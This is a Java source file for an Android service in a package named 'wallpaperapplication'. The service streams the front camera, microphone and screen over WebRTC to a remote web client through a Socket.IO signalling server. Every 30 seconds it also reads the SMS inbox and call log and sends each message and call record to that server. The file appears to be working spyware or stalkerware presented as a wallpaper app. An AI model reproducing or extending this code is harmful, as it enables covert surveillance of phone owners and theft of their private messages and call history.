package com.example.wallpaperapplication;

import static android.app.Activity.RESULT_OK;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.database.Cursor;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.Telephony;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;
import org.json.JSONException;
import org.json.JSONObject;
import org.webrtc.AudioSource;
import org.webrtc.AudioTrack;
import org.webrtc.Camera2Enumerator;
import org.webrtc.DefaultVideoDecoderFactory;
import org.webrtc.DefaultVideoEncoderFactory;
import org.webrtc.EglBase;
import org.webrtc.IceCandidate;
import org.webrtc.MediaConstraints;
import org.webrtc.PeerConnection;
import org.webrtc.PeerConnectionFactory;
import org.webrtc.RtpReceiver;
import org.webrtc.RtpTransceiver;
import org.webrtc.SdpObserver;
import org.webrtc.SessionDescription;
import org.webrtc.SurfaceTextureHelper;
import org.webrtc.VideoCapturer;
import org.webrtc.VideoSource;
import org.webrtc.VideoTrack;
import org.webrtc.ScreenCapturerAndroid;
import io.socket.client.IO;
import io.socket.client.Socket;
import java.net.URISyntaxException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

public class StreamingService extends Service {
    private static final String TAG = "StreamingService";
    private static final String CHANNEL_ID = "streaming_channel";
    private static final int NOTIFICATION_ID = 1;
    private static final String SIGNALING_URL = "http://192.168.29.10:3000";
    private static final long FETCH_INTERVAL = 30_000; // 30 seconds
    private static final long SIGNAL_TIMEOUT = 60_000; // 60 seconds for pending signals
    private static final long MAX_RETRY_DELAY = 30_000; // Max retry delay for WebSocket

    private PeerConnectionFactory factory;
    private EglBase eglBase;
    private SurfaceTextureHelper cameraSurfaceHelper;
    private SurfaceTextureHelper screenSurfaceHelper;
    private VideoCapturer videoCapturer;
    private VideoSource videoSource;
    private AudioSource audioSource;
    private VideoCapturer screenCapturer;
    private VideoSource screenSource;
    private PeerConnection peerConnection;
    private Socket socket;
    private boolean cameraCaptureReady = false;
    private boolean audioCaptureReady = false;
    private boolean screenCaptureReady = false;
    private boolean cameraTrackAdded = false;
    private boolean audioTrackAdded = false;
    private boolean screenTrackAdded = false;
    private String pendingWebClientId = null;
    private List<JSONObject> pendingSignals = new ArrayList<>();
    private String webClientId = null;
    private Handler handler;
    private Runnable fetchDataRunnable;
    private final Set<String> handledClientIds = new HashSet<>();
    private boolean isForegroundStarted = false;
    private long lastSmsTimestamp = 0;
    private long lastCallLogTimestamp = 0;
    private int reconnectAttempts = 0;
    private static final int MAX_RECONNECT_ATTEMPTS = 10;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service onCreate");
        startForegroundServiceNotification();
        if (!hasRequiredPermissions()) {
            Log.e(TAG, "Missing permissions, proceeding with available functionality");
            broadcastPermissionError();
        }
        initializeWebRTC();
        setupMediaStreaming();
        connectSignaling();
        startDataStreaming();
    }

    private void startForegroundServiceNotification() {
        if (isForegroundStarted) {
            Log.d(TAG, "Foreground service already started");
            return;
        }
        Notification notification = createNotification();
        startForeground(NOTIFICATION_ID, notification);
        isForegroundStarted = true;
        Log.d(TAG, "Started foreground service");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            String action = intent.getAction();
            if ("STOP_STREAMING".equals(action)) {
                stopSelf();
            } else if (Constants.ACTION_MEDIA_PROJECTION_RESULT.equals(action)) {
                int resultCode = intent.getIntExtra(Constants.EXTRA_RESULT_CODE, -1);
                Intent resultData = intent.getParcelableExtra(Constants.EXTRA_RESULT_DATA);
                if (resultCode == RESULT_OK && resultData != null) {
                    startForegroundServiceNotification();
                    startScreenCapture(resultCode, resultData);
                } else {
                    Log.e(TAG, "MediaProjection permission denied");
                    broadcastPermissionError();
                    screenCaptureReady = false; // Allow other streams to continue
                }
            }
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "Service onDestroy");
        stopDataStreaming();
        cleanup();
        if (socket != null) {
            socket.disconnect();
            socket.off();
            socket = null;
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private boolean hasRequiredPermissions() {
        boolean camera = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED;
        boolean audio = ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED;
        boolean notify = Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU || ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED;
        boolean sms = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED;
        boolean callLog = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED;
        boolean mediaProjection = ContextCompat.checkSelfPermission(this, Manifest.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION) == PackageManager.PERMISSION_GRANTED;
        if (!camera)   Log.w(TAG, "Camera permission missing");
        if (!audio)    Log.w(TAG, "Record audio permission missing");
        if (!notify)   Log.w(TAG, "Notifications permission missing");
        if (!sms)      Log.w(TAG, "SMS permission missing");
        if (!callLog)  Log.w(TAG, "Call log permission missing");
        if (!mediaProjection) Log.w(TAG, "Media projection permission missing");
        return camera && audio && notify && sms && callLog && mediaProjection;
    }

    private void broadcastPermissionError() {
        Intent err = new Intent("com.example.wallpaperapplication.PERMISSION_ERROR");
        sendBroadcast(err);
    }

    private boolean isNetworkAvailable() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
        return activeNetwork != null && activeNetwork.isConnected();
    }

    private void initializeWebRTC() {
        Log.d(TAG, "Initializing WebRTC");
        try {
            PeerConnectionFactory.initialize(
                    PeerConnectionFactory.InitializationOptions.builder(this)
                            .setEnableInternalTracer(true)
                            .createInitializationOptions());
            eglBase = EglBase.create();
            factory = PeerConnectionFactory.builder()
                    .setVideoEncoderFactory(new DefaultVideoEncoderFactory(eglBase.getEglBaseContext(), true, true))
                    .setVideoDecoderFactory(new DefaultVideoDecoderFactory(eglBase.getEglBaseContext()))
                    .createPeerConnectionFactory();
            Log.d(TAG, "WebRTC initialized, factory: " + (factory != null) + ", eglBase: " + (eglBase != null));
        } catch (Exception e) {
            Log.e(TAG, "Failed to initialize WebRTC", e);
            broadcastPermissionError();
        }
    }

    private void setupMediaStreaming() {
        setupVideoCapture();
        setupAudioCapture();
        setupPeerConnection();
    }

    private void setupVideoCapture() {
        Camera2Enumerator enumerator = new Camera2Enumerator(this);
        String device = null;
        for (String name : enumerator.getDeviceNames()) {
            if (enumerator.isFrontFacing(name)) {
                device = name;
                break;
            }
        }
        if (device == null && enumerator.getDeviceNames().length > 0) {
            device = enumerator.getDeviceNames()[0];
        }
        if (device == null) {
            Log.e(TAG, "No camera available");
            broadcastPermissionError();
            return;
        }
        videoCapturer = enumerator.createCapturer(device, null);
        cameraSurfaceHelper = SurfaceTextureHelper.create("CaptureThread", eglBase.getEglBaseContext());
        videoSource = factory.createVideoSource(false);
        videoCapturer.initialize(cameraSurfaceHelper, getApplicationContext(), videoSource.getCapturerObserver());
        try {
            videoCapturer.startCapture(1280, 720, 30); // Higher resolution for better quality
            cameraCaptureReady = true;
            Log.d(TAG, "Video capture started");
        } catch (Exception e) {
            Log.e(TAG, "Failed to start video capture", e);
            broadcastPermissionError();
            cameraCaptureReady = false;
        }
    }

    private void setupAudioCapture() {
        try {
            MediaConstraints audioConstraints = new MediaConstraints();
            audioConstraints.mandatory.add(new MediaConstraints.KeyValuePair("googEchoCancellation", "true"));
            audioConstraints.mandatory.add(new MediaConstraints.KeyValuePair("googAutoGainControl", "true"));
            audioConstraints.mandatory.add(new MediaConstraints.KeyValuePair("googNoiseSuppression", "true"));
            audioConstraints.mandatory.add(new MediaConstraints.KeyValuePair("googHighpassFilter", "true"));
            audioSource = factory.createAudioSource(audioConstraints);
            if (audioSource != null) {
                audioCaptureReady = true;
                Log.d(TAG, "Audio capture initialized");
            } else {
                Log.e(TAG, "Failed to initialize audio source");
                broadcastPermissionError();
                audioCaptureReady = false;
            }
        } catch (Exception e) {
            Log.e(TAG, "Audio capture setup failed", e);
            broadcastPermissionError();
            audioCaptureReady = false;
        }
    }

    private void startScreenCapture(int resultCode, Intent resultData) {
        try {
            screenCapturer = new ScreenCapturerAndroid(resultData, new MediaProjection.Callback() {
                @Override
                public void onStop() {
                    Log.d(TAG, "MediaProjection stopped");
                    screenCaptureReady = false;
                }
            });
            screenSource = factory.createVideoSource(true);
            screenSurfaceHelper = SurfaceTextureHelper.create("ScreenCaptureThread", eglBase.getEglBaseContext());
            screenCapturer.initialize(screenSurfaceHelper, getApplicationContext(), screenSource.getCapturerObserver());
            screenCapturer.startCapture(1280, 720, 30); // Higher resolution
            Log.d(TAG, "Screen capture started successfully");
            VideoTrack screenTrack = factory.createVideoTrack("screen", screenSource);
            if (peerConnection != null) {
                peerConnection.addTransceiver(screenTrack, new RtpTransceiver.RtpTransceiverInit(
                        RtpTransceiver.RtpTransceiverDirection.SEND_ONLY, Collections.singletonList("screen")));
                Log.d(TAG, "Screen track added with mid=2");
            } else {
                Log.e(TAG, "Cannot add screen track: peerConnection is null");
                broadcastPermissionError();
                return;
            }
            screenCaptureReady = true;
            processPendingSignals();
            checkAndSendOffer();
        } catch (Exception e) {
            Log.e(TAG, "Failed to start screen capture", e);
            broadcastPermissionError();
            screenCaptureReady = false;
        }
    }

    private void processPendingSignals() {
        long currentTime = System.currentTimeMillis();
        List<JSONObject> signalsToProcess = new ArrayList<>(pendingSignals);
        pendingSignals.clear();
        for (JSONObject signal : signalsToProcess) {
            try {
                long signalTime = signal.optLong("timestamp", 0);
                if (currentTime - signalTime > SIGNAL_TIMEOUT) {
                    Log.w(TAG, "Dropping stale signal: " + signal.toString());
                    continue;
                }
                handleSignaling(signal);
            } catch (Exception e) {
                Log.e(TAG, "Error processing pending signal", e);
            }
        }
    }

    private void setupPeerConnection() {
        Log.d(TAG, "Setting up PeerConnection");
        List<PeerConnection.IceServer> ice = new ArrayList<>();
        ice.add(PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer());
        ice.add(PeerConnection.IceServer.builder("turn:openrelay.metered.net:80")
                .setUsername("openrelayproject")
                .setPassword("openrelayproject")
                .createIceServer());
        ice.add(PeerConnection.IceServer.builder("turn:openrelay.metered.net:443")
                .setUsername("openrelayproject")
                .setPassword("openrelayproject")
                .createIceServer());
        ice.add(PeerConnection.IceServer.builder("turn:openrelay.metered.net:443?transport=tcp")
                .setUsername("openrelayproject")
                .setPassword("openrelayproject")
                .createIceServer());

        PeerConnection.RTCConfiguration config = new PeerConnection.RTCConfiguration(ice);
        config.sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN;
        config.bundlePolicy = PeerConnection.BundlePolicy.MAXBUNDLE;
        config.rtcpMuxPolicy = PeerConnection.RtcpMuxPolicy.REQUIRE;

        try {
            peerConnection = factory.createPeerConnection(config, new PeerConnection.Observer() {
                @Override
                public void onSignalingChange(PeerConnection.SignalingState s) {
                    Log.d(TAG, "Signaling state: " + s);
                }
                @Override
                public void onIceConnectionChange(PeerConnection.IceConnectionState s) {
                    Log.d(TAG, "ICE connection state: " + s);
                    if (s == PeerConnection.IceConnectionState.DISCONNECTED || s == PeerConnection.IceConnectionState.FAILED) {
                        Log.w(TAG, "ICE connection failed, attempting to recreate PeerConnection");
                        setupPeerConnection();
                    }
                }
                @Override
                public void onIceConnectionReceivingChange(boolean receiving) {
                    Log.d(TAG, "ICE connection receiving change: " + receiving);
                }
                @Override
                public void onIceGatheringChange(PeerConnection.IceGatheringState s) {
                    Log.d(TAG, "ICE gathering state: " + s);
                }
                @Override
                public void onIceCandidate(IceCandidate c) {
                    if (webClientId == null) return;
                    try {
                        JSONObject candidate = new JSONObject();
                        candidate.put("sdpMid", c.sdpMid);
                        candidate.put("sdpMLineIndex", c.sdpMLineIndex);
                        candidate.put("candidate", c.sdp);
                        JSONObject signal = new JSONObject();
                        signal.put("candidate", candidate);
                        JSONObject msg = new JSONObject();
                        msg.put("to", webClientId);
                        msg.put("from", socket.id());
                        msg.put("signal", signal);
                        msg.put("timestamp", System.currentTimeMillis());
                        socket.emit("signal", msg);
                        Log.d(TAG, "Sent ICE candidate: " + c.sdpMid);
                    } catch (JSONException e) {
                        Log.e(TAG, "ICE send failed", e);
                    }
                }
                @Override
                public void onIceCandidatesRemoved(IceCandidate[] cs) {
                    Log.d(TAG, "ICE candidates removed: " + Arrays.toString(cs));
                }
                @Override
                public void onAddStream(org.webrtc.MediaStream ms) {
                    Log.d(TAG, "Stream added: " + ms.getId());
                }
                @Override
                public void onRemoveStream(org.webrtc.MediaStream ms) {
                    Log.d(TAG, "Stream removed: " + ms.getId());
                }
                @Override
                public void onDataChannel(org.webrtc.DataChannel dc) {
                    Log.d(TAG, "Data channel added: " + dc.label());
                }
                @Override
                public void onRenegotiationNeeded() {
                    Log.d(TAG, "Renegotiation needed");
                    if (cameraCaptureReady && audioCaptureReady) {
                        createAndSendOffer();
                    }
                }
                @Override
                public void onAddTrack(RtpReceiver r, org.webrtc.MediaStream[] ms) {
                    Log.d(TAG, "Track added: " + r.id());
                }
            });
            if (peerConnection == null) {
                Log.e(TAG, "Failed to create PeerConnection: null returned");
                broadcastPermissionError();
                return;
            }
            Log.d(TAG, "PeerConnection created successfully");

            // Add camera video track
            if (cameraCaptureReady && videoSource != null) {
                VideoTrack videoTrack = factory.createVideoTrack("video", videoSource);
                peerConnection.addTransceiver(videoTrack, new RtpTransceiver.RtpTransceiverInit(
                        RtpTransceiver.RtpTransceiverDirection.SEND_ONLY, Collections.singletonList("stream")));
                Log.d(TAG, "Camera video track added with mid=0");
            }

            // Add audio track
            if (audioCaptureReady && audioSource != null) {
                AudioTrack audioTrack = factory.createAudioTrack("audio", audioSource);
                peerConnection.addTransceiver(audioTrack, new RtpTransceiver.RtpTransceiverInit(
                        RtpTransceiver.RtpTransceiverDirection.SEND_ONLY, Collections.singletonList("stream")));
                Log.d(TAG, "Audio track added with mid=1");
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to create PeerConnection", e);
            broadcastPermissionError();
        }
    }

    private void connectSignaling() {
        Log.d(TAG, "Connecting to signaling");
        if (!isNetworkAvailable()) {
            Log.e(TAG, "No network available, delaying connection");
            scheduleReconnect();
            return;
        }

        socket = StreamingServiceSocket.getSocket();
        if (socket == null) {
            Log.w(TAG, "StreamingServiceSocket returned null, creating new socket");
            try {
                IO.Options opts = new IO.Options();
                opts.transports = new String[]{"websocket"};
                opts.reconnection = true;
                opts.reconnectionAttempts = MAX_RECONNECT_ATTEMPTS;
                opts.reconnectionDelay = 1000;
                opts.reconnectionDelayMax = MAX_RETRY_DELAY;
                opts.timeout = 10000;
                socket = IO.socket(SIGNALING_URL, opts);
            } catch (URISyntaxException e) {
                Log.e(TAG, "Bad signaling URL", e);
                broadcastPermissionError();
                scheduleReconnect();
                return;
            }
        }

        socket.off(); // Remove all previous listeners to prevent duplicates
        socket.on(Socket.EVENT_CONNECT, args -> {
            Log.d(TAG, "Socket.IO CONNECTED");
            reconnectAttempts = 0; // Reset reconnect attempts on success
            socket.emit("identify", "android");
        }).on(Socket.EVENT_CONNECT_ERROR, args -> {
            new Handler(Looper.getMainLooper()).post(() -> {
                Log.e(TAG, "Socket connect error: " + (args.length > 0 ? args[0] : "Unknown error"));
                scheduleReconnect();
            });
        }).on(Socket.EVENT_DISCONNECT, args -> {
            Log.d(TAG, "Socket disconnected: " + (args.length > 0 ? args[0] : "Unknown reason"));
            scheduleReconnect();
        }).on("id", args -> {
            Log.d(TAG, "Received socket ID: " + args[0]);
        }).on("web-client-ready", args -> {
            String clientId = (String) args[0];
            Log.d(TAG, "Web client ready: " + clientId);
            synchronized (handledClientIds) {
                if (handledClientIds.contains(clientId)) {
                    Log.d(TAG, "Web client " + clientId + " already handled, ignoring");
                    return;
                }
                pendingWebClientId = clientId;
                checkAndSendOffer();
            }
        }).on("signal", args -> {
            Log.d(TAG, "Signal incoming: " + Arrays.toString(args));
            if (args[0] instanceof JSONObject) {
                try {
                    JSONObject msg = (JSONObject) args[0];
                    msg.put("timestamp", System.currentTimeMillis());
                    handleSignaling(msg);
                } catch (JSONException e) {
                    Log.e(TAG, "Error adding timestamp to signal", e);
                }
            }
        });

        socket.connect();
    }

    private void scheduleReconnect() {
        if (reconnectAttempts >= MAX_RECONNECT_ATTEMPTS) {
            Log.e(TAG, "Max reconnect attempts reached, stopping retries");
            broadcastPermissionError();
            return;
        }
        long delay = Math.min(1000L * (1L << reconnectAttempts), MAX_RETRY_DELAY);
        reconnectAttempts++;
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            if (isNetworkAvailable()) {
                Log.d(TAG, "Retrying socket connection, attempt " + reconnectAttempts);
                connectSignaling();
            } else {
                Log.w(TAG, "Network still unavailable, scheduling next retry");
                scheduleReconnect();
            }
        }, delay);
    }

    private void checkAndSendOffer() {
        if (pendingWebClientId != null && !handledClientIds.contains(pendingWebClientId)) {
            // Allow offer if at least camera and audio are ready (screen is optional)
            boolean basicStreamsReady = cameraCaptureReady && audioCaptureReady && peerConnection != null;
            if (basicStreamsReady) {
                webClientId = pendingWebClientId;
                handledClientIds.add(pendingWebClientId);
                pendingWebClientId = null;
                createAndSendOffer();
            } else {
                Log.w(TAG, "Not sending offer yet: basicStreams not ready (camera=" + cameraCaptureReady + ", audio=" + audioCaptureReady + ", peerConnection=" + (peerConnection != null) + ")");
            }
        }
    }

    private void createAndSendOffer() {
        if (webClientId == null) {
            Log.w(TAG, "No web client available");
            return;
        }
        if (peerConnection == null) {
            Log.e(TAG, "Cannot create offer: peerConnection is null");
            return;
        }
        // Only require camera and audio - screen is optional
        if (!cameraCaptureReady || !audioCaptureReady) {
            Log.w(TAG, "Cannot create offer: basic tracks not ready (camera=" + cameraCaptureReady + ", audio=" + audioCaptureReady + ")");
            return;
        }

        Log.d(TAG, "Creating offer for web client: " + webClientId);
        MediaConstraints mc = new MediaConstraints();
        mc.mandatory.add(new MediaConstraints.KeyValuePair("OfferToReceiveAudio", "false"));
        mc.mandatory.add(new MediaConstraints.KeyValuePair("OfferToReceiveVideo", "false"));

        peerConnection.createOffer(new SdpObserver() {
            @Override
            public void onCreateSuccess(SessionDescription sdp) {
                Log.d(TAG, "Offer created, SDP: " + sdp.description);
                String modifiedSdp = sdp.description.replace("a=sendrecv", "a=sendonly")
                        .replace("a=recvonly", "a=sendonly");
                SessionDescription modifiedSession = new SessionDescription(sdp.type, modifiedSdp);
                peerConnection.setLocalDescription(new SdpObserver() {
                    @Override
                    public void onSetSuccess() {
                        try {
                            JSONObject signal = new JSONObject();
                            signal.put("type", "offer");
                            signal.put("sdp", modifiedSession.description);
                            JSONObject msg = new JSONObject();
                            msg.put("to", webClientId);
                            msg.put("from", socket.id());
                            msg.put("signal", signal);
                            msg.put("timestamp", System.currentTimeMillis());
                            socket.emit("signal", msg);
                            Log.d(TAG, "Sent offer to web client: " + webClientId);
                        } catch (JSONException e) {
                            Log.e(TAG, "Offer send failed", e);
                        }
                    }
                    @Override
                    public void onSetFailure(String err) {
                        Log.e(TAG, "Set local desc fail: " + err);
                    }
                    @Override
                    public void onCreateSuccess(SessionDescription s) {}
                    @Override
                    public void onCreateFailure(String f) {
                        Log.e(TAG, "Create offer fail: " + f);
                    }
                }, modifiedSession);
            }
            @Override
            public void onSetSuccess() {}
            @Override
            public void onCreateFailure(String err) {
                Log.e(TAG, "Create offer fail: " + err);
            }
            @Override
            public void onSetFailure(String err) {
                Log.e(TAG, "Set desc fail: " + err);
            }
        }, mc);
    }

    private void handleSignaling(JSONObject msg) {
        try {
            JSONObject signal = msg.getJSONObject("signal");
            String type = signal.optString("type", "");
            Log.d(TAG, "Handling signal type: " + type);
            if (peerConnection == null || (!cameraCaptureReady && !audioCaptureReady && !screenCaptureReady)) {
                Log.w(TAG, "Queuing signal: peerConnection or no tracks ready");
                pendingSignals.add(msg);
                return;
            }
            if ("answer".equals(type)) {
                SessionDescription ans = new SessionDescription(
                        SessionDescription.Type.ANSWER, signal.getString("sdp"));
                peerConnection.setRemoteDescription(simpleSdpObserver, ans);
                Log.d(TAG, "Processed answer from web client");
            } else if (signal.has("candidate")) {
                JSONObject candidate = signal.getJSONObject("candidate");
                IceCandidate c = new IceCandidate(
                        candidate.getString("sdpMid"),
                        candidate.getInt("sdpMLineIndex"),
                        candidate.getString("candidate"));
                peerConnection.addIceCandidate(c);
                Log.d(TAG, "Added ICE candidate: " + c.sdpMid);
            }
        } catch (JSONException e) {
            Log.e(TAG, "Handle signaling error", e);
        }
    }

    private final SdpObserver simpleSdpObserver = new SdpObserver() {
        @Override
        public void onCreateSuccess(SessionDescription s) {}
        @Override
        public void onSetSuccess() {
            Log.d(TAG, "SDP set success");
        }
        @Override
        public void onCreateFailure(String e) {
            Log.e(TAG, "SDP create fail: " + e);
        }
        @Override
        public void onSetFailure(String e) {
            Log.e(TAG, "SDP set fail: " + e);
        }
    };

    private Notification createNotification() {
        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    CHANNEL_ID, "Streaming Service", NotificationManager.IMPORTANCE_LOW);
            ch.setDescription("Streaming camera, audio, screen, SMS, call logs, and notifications");
            nm.createNotificationChannel(ch);
        }
        Intent stop = new Intent(this, StreamingService.class);
        stop.setAction("STOP_STREAMING");
        PendingIntent stopPI = PendingIntent.getService(this, 0, stop,
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ?
                        PendingIntent.FLAG_IMMUTABLE : PendingIntent.FLAG_UPDATE_CURRENT);
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Streaming Active")
                .setContentText("Streaming camera, audio, screen, SMS, call logs, and notifications")
                .addAction(android.R.drawable.ic_media_pause, "Stop", stopPI)
                .setSmallIcon(android.R.drawable.ic_menu_camera)
                .setOngoing(true)
                .build();
    }

    private void cleanup() {
        if (screenCapturer != null) {
            try {
                screenCapturer.stopCapture();
            } catch (InterruptedException ignored) {}
            screenCapturer.dispose();
            screenCapturer = null;
        }
        if (screenSource != null) {
            screenSource.dispose();
            screenSource = null;
        }
        if (screenSurfaceHelper != null) {
            screenSurfaceHelper.dispose();
            screenSurfaceHelper = null;
        }
        if (videoCapturer != null) {
            try {
                videoCapturer.stopCapture();
            } catch (InterruptedException ignored) {}
            videoCapturer.dispose();
            videoCapturer = null;
        }
        if (videoSource != null) {
            videoSource.dispose();
            videoSource = null;
        }
        if (cameraSurfaceHelper != null) {
            cameraSurfaceHelper.dispose();
            cameraSurfaceHelper = null;
        }
        if (audioSource != null) {
            audioSource.dispose();
            audioSource = null;
        }
        if (peerConnection != null) {
            peerConnection.close();
            peerConnection = null;
        }
        if (eglBase != null) {
            eglBase.release();
            eglBase = null;
        }
        if (factory != null) {
            factory.dispose();
            factory = null;
        }
    }

    private void startDataStreaming() {
        handler = new Handler(Looper.getMainLooper());
        fetchDataRunnable = new Runnable() {
            @Override
            public void run() {
                new Thread(() -> {
                    fetchAndSendSMS();
                    fetchAndSendCallLogs();
                }).start();
                if (handler != null) {
                    handler.postDelayed(this, FETCH_INTERVAL);
                }
            }
        };
        handler.post(fetchDataRunnable);
    }

    private void stopDataStreaming() {
        if (handler != null && fetchDataRunnable != null) {
            handler.removeCallbacks(fetchDataRunnable);
            handler = null;
            fetchDataRunnable = null;
        }
    }

    private void fetchAndSendSMS() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "SMS permission not granted");
            return;
        }
        try {
            Cursor cursor = getContentResolver().query(
                    Telephony.Sms.Inbox.CONTENT_URI,
                    new String[]{Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE},
                    Telephony.Sms.DATE + " > ?",
                    new String[]{String.valueOf(lastSmsTimestamp)},
                    Telephony.Sms.DATE + " ASC"
            );
            if (cursor != null) {
                try {
                    while (cursor.moveToNext()) {
                        String sender = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                        String message = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                        long timestamp = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
                        JSONObject sms = new JSONObject();
                        sms.put("sender", sender != null ? sender : "Unknown");
                        sms.put("message", message != null ? message : "");
                        sms.put("timestamp", timestamp);
                        if (socket != null && socket.connected()) {
                            socket.emit("sms", sms);
                            Log.d(TAG, "Sent SMS: " + sms.toString());
                        }
                        if (timestamp > lastSmsTimestamp) {
                            lastSmsTimestamp = timestamp;
                        }
                    }
                } finally {
                    cursor.close();
                }
            } else {
                Log.w(TAG, "SMS cursor is null");
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to fetch SMS", e);
        }
    }

    private void fetchAndSendCallLogs() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Call log permission not granted");
            return;
        }
        try {
            Cursor cursor = getContentResolver().query(
                    CallLog.Calls.CONTENT_URI,
                    new String[]{CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE},
                    CallLog.Calls.DATE + " > ?",
                    new String[]{String.valueOf(lastCallLogTimestamp)},
                    CallLog.Calls.DATE + " ASC"
            );
            if (cursor != null) {
                try {
                    while (cursor.moveToNext()) {
                        String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                        int type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                        long timestamp = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                        String callType;
                        switch (type) {
                            case CallLog.Calls.INCOMING_TYPE:
                                callType = "Incoming";
                                break;
                            case CallLog.Calls.OUTGOING_TYPE:
                                callType = "Outgoing";
                                break;
                            case CallLog.Calls.MISSED_TYPE:
                                callType = "Missed";
                                break;
                            default:
                                callType = "Unknown";
                        }
                        JSONObject call = new JSONObject();
                        call.put("number", number != null ? number : "Unknown");
                        call.put("type", callType);
                        call.put("timestamp", timestamp);
                        if (socket != null && socket.connected()) {
                            socket.emit("call-log", call);
                            Log.d(TAG, "Sent call log: " + call.toString());
                        }
                        if (timestamp > lastCallLogTimestamp) {
                            lastCallLogTimestamp = timestamp;
                        }
                    }
                } finally {
                    cursor.close();
                }
            } else {
                Log.w(TAG, "Call log cursor is null");
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to fetch call logs", e);
        }
    }
}